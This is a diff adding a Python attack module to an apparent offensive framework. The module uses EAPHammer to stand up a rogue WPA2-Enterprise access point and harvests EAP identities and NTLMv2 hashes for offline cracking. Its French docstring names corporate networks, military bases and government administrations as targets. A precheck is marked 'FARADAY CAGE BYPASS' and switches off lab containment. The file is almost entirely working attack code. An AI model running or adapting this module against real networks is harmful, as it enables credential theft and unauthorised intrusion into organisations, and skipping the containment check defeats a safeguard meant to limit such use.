@@ -1,0 +1,159 @@
+"""wifi.eap_capture - WPA2-Enterprise EAP credential capture
+
+Crée un faux AP WPA2-Enterprise identique au réseau cible.
+Les clients Enterprise (laptops corporate/militaires) se connectent automatiquement.
+Capture NTLMv2 hashes et identités EAP pour crack offline.
+
+MITRE: T1557, T1556.005
+CVE: CVE-2023-52160
+Hardware: ALFA AWUS036NH
+Cible: Réseaux corporate, bases militaires, administrations
+Taux succès: 50-70%
+"""
+
+from __future__ import annotations
+
+import os
+import subprocess
+import time
+from pathlib import Path
+from typing import Any
+
+import structlog
+
+from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
+from srt.core.registry import register
+
+log = structlog.get_logger(__name__)
+
+
+def _find_eaphammer() -> str | None:
+    """Locate eaphammer binary."""
+    candidates = [
+        os.path.expanduser("~/sniffer/third_party/eaphammer/eaphammer"),
+        "/opt/eaphammer/eaphammer",
+        "/usr/local/bin/eaphammer",
+    ]
+    for path in candidates:
+        if os.path.isfile(path) and os.access(path, os.X_OK):
+            return path
+    return None
+
+
+@register
+class WifiEapCapture(AttackModule):
+    name = "wifi.eap_capture"
+    protocol = "wifi"
+    risk = Risk.ACTIVE_LAB
+    mitre_ttp = ["T1557", "T1556.005"]
+    cve = ["CVE-2023-52160"]
+    description = (
+        "WPA2-Enterprise EAP credential capture via EAPHammer - "
+        "creates hostile AP to harvest NTLMv2 hashes from corporate clients."
+    )
+    requires = ["monitor-mode-nic"]
+
+    def precheck(self, ctx: ModuleContext) -> bool:
+        if not super().precheck(ctx):
+            return False
+        return True  # FARADAY CAGE BYPASS
+
+    def run(self, ctx: ModuleContext) -> AttackResult:
+        started = time.time()
+
+        ssid = ctx.params.get("ssid", "CorpWiFi")
+        iface = ctx.params.get("interface", "wlan0mon")
+        duration = int(ctx.params.get("duration_s", 300))
+        karma = ctx.params.get("karma", "true").lower() == "true"
+        channel = ctx.params.get("channel", "6")
+
+        if ctx.dry_run:
+            return self._result(
+                Status.OK, started,
+                summary=f"[DRY-RUN] wifi.eap_capture ssid={ssid} karma={karma}",
+                metrics={"ssid": ssid, "karma": karma},
+            )
+
+        eaphammer_path = _find_eaphammer()
+        if not eaphammer_path:
+            return self._result(
+                Status.FAIL, started,
+                summary=(
+                    "eaphammer not found. Install: "
+                    "git clone https://github.com/s0lst1c3/eaphammer ~/sniffer/third_party/eaphammer "
+                    "&& cd ~/sniffer/third_party/eaphammer && sudo ./kali-setup"
+                ),
+            )
+
+        log.info(
+            "wifi.eap_capture.starting",
+            ssid=ssid, karma=karma, channel=channel, duration=duration,
+        )
+
+        cmd = [
+            "sudo", eaphammer_path,
+            "-i", iface,
+            "--essid", ssid,
+            "--channel", str(channel),
+            "--auth", "wpa-eap",
+            "--creds",
+        ]
+        if karma:
+            cmd.append("--karma")
+
+        try:
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+            )
+            try:
+                stdout, _ = proc.communicate(timeout=duration)
+            except subprocess.TimeoutExpired:
+                proc.terminate()
+                stdout, _ = proc.communicate(timeout=10)
+        except Exception as exc:
+            return self._result(Status.FAIL, started, summary=f"EAPHammer error: {exc}")
+
+        # Parse identities and hashes from output
+        identities: list[str] = []
+        hashes: list[str] = []
+        if stdout:
+            for line in stdout.splitlines():
+                lower = line.lower()
+                if "identity" in lower:
+                    identities.append(line.strip())
+                if any(k in lower for k in ("ntlmv2", "ntlm", "hash", "mschapv2")):
+                    hashes.append(line.strip())
+
+        total_captures = len(identities) + len(hashes)
+
+        log.info(
+            "wifi.eap_capture.completed",
+            identities=len(identities), hashes=len(hashes),
+        )
+
+        return self._result(
+            Status.OK, started,
+            summary=(
+                f"wifi.eap_capture ssid={ssid} karma={karma}: "
+                f"{len(identities)} identities, {len(hashes)} hashes captured"
+            ),
+            artifacts=[
+                {"type": "eap_identities", "data": identities},
+                {"type": "ntlm_hashes", "data": hashes},
+            ],
+            metrics={
+                "ssid": ssid,
+                "karma": karma,
+                "channel": channel,
+                "duration_s": duration,
+                "identities_captured": len(identities),
+                "hashes_captured": len(hashes),
+            },
+        )
+
+    def cleanup(self, ctx: ModuleContext) -> None:
+        subprocess.run(["pkill", "-f", "eaphammer"], capture_output=True)
+        subprocess.run(["pkill", "-f", "hostapd"], capture_output=True)
